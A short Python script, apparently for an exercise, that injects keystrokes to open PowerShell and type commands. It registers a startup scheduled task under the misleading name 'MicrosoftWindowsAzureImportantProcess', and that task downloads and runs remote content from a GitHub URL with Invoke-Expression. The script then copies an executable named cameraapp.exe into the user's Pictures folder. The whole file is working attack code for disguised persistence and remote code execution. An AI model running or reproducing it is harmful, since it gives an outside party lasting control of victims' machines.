import os
import keyboard
import sys
module_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'keyboard_module'))
sys.path.insert(0, module_dir)
import keyboard
import time

def simulate_typing_and_actions(text, text2):

    # Simulate pressing the Windows key
    keyboard.press("win")
    keyboard.release("win")
    time.sleep(1)  # Sleep for 1 second to give time for the action to complete
    keyboard.write("powershell")
    time.sleep(1)  # Sleep for 1 second to give time for the action to complete
    keyboard.press_and_release("enter")
    time.sleep(1)  # Sleep for 1 second to give time for the action to complete

    # Simulate typing the specified text
    keyboard.write(text)
    time.sleep(2)  # Sleep for 2 seconds to give time for the typing to complete
    keyboard.write(text2)
    time.sleep(2)  # Sleep for 2 seconds to give time for the typing to complete
    # Simulate pressing Enter
    keyboard.press_and_release("enter")
    time.sleep(1)  # Sleep for 1 second to give time for the action to complete
    keyboard.write("exit")
    time.sleep(1) 
    keyboard.press_and_release("enter")
if __name__ == "__main__":
    text_to_type = "Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Shamill-stewart/ExerciseTest/main/test.txt').Content') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName 'MicrosoftWindowsAzureImportantProcess'"
    text2_to_type = r";Copy-Item -Path 'C:\Users\IRAdmin\Downloads\cameraapp.exe' -Destination 'C:\Users\IRAdmin\pictures\cameraapp.exe'"
    simulate_typing_and_actions(text_to_type, text2_to_type)
